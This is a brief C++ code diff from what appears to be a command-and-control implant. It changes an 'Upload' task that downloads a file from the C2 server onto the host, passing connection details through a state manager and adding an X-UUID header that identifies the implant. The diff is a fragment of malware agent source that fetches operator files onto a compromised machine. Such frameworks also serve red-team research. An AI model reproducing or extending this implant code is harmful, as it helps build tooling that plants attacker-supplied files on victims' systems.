@@ -2,14 +2,17 @@
 
 namespace Task
 {
-    std::wstring Upload(HINTERNET hConnect, const std::wstring& wSrc, const std::wstring& wDest)
+    std::wstring Upload(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest)
     {
+        std::wstring wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n";
+
         // Download a specified file from the C2 server.
         BOOL bResult = System::Http::DownloadFile(
-            hConnect,
-            LISTENER_HOST_W,
-            LISTENER_PORT,
-            REQUEST_PATH_DOWNLOAD_W,
+            sm.GetHConnect(),
+            sm.GetListenerHost(),
+            sm.GetListenerPort(),
+            sm.GetReqPathDownload(),
+            wHeaders.c_str(),
             wSrc,
             wDest
         );
